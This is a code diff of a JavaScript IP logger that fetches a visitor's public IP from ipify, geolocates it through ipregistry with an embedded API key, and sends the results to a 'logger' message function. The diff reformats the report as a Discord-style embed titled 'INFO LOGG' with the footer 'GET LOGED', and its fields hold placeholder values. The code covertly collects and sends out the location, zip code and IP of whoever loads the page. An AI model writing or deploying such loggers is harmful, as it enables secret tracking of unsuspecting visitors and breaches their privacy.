@@ -13,7 +13,45 @@ function sendMessage(msg, name, avt) {
 function serch(ip){
     fetch('https://api.ipregistry.co/' + ip + '?key=xgyxzqntjw3tx4wh')
         .then(response => response.json())
-        .then(data => sendMessage(data.location.city + ", " + data.location.region.name + ", " + data.location.continent.name + " | zip:" + data.location.postal + " | ip:" + data.ip, "logger", "")  )
+        .then(data => sendMessage({
+            "content": null,
+            "embeds": [
+              {
+                "title": "💀INFO LOGG💀",
+                "color": 39423,
+                "fields": [
+                  {
+                    "name": "CONT:                              💀",
+                    "value": "plc"
+                  },
+                  {
+                    "name": "REGION:                          💀",
+                    "value": "plc"
+                  },
+                  {
+                    "name": "ZIP:                                    💀",
+                    "value": "plc"
+                  },
+                  {
+                    "name": "IP:                                       💀",
+                    "value": "plc"
+                  },
+                  {
+                    "name": "ISP:                                     💀",
+                    "value": "plc"
+                  }
+                ],
+                "author": {
+                  "name": "~thatguy.~",
+                  "icon_url": "https://wallpapers-clan.com/wp-content/uploads/2022/10/skeleton-pfp-7.jpg"
+                },
+                "footer": {
+                  "text": "💀GET LOGED💀"
+                }
+              }
+            ],
+            "attachments": []
+          }, "logger", "")  )
 }
 fetch("https://api.ipify.org?format=json")
     .then(response => response.json())
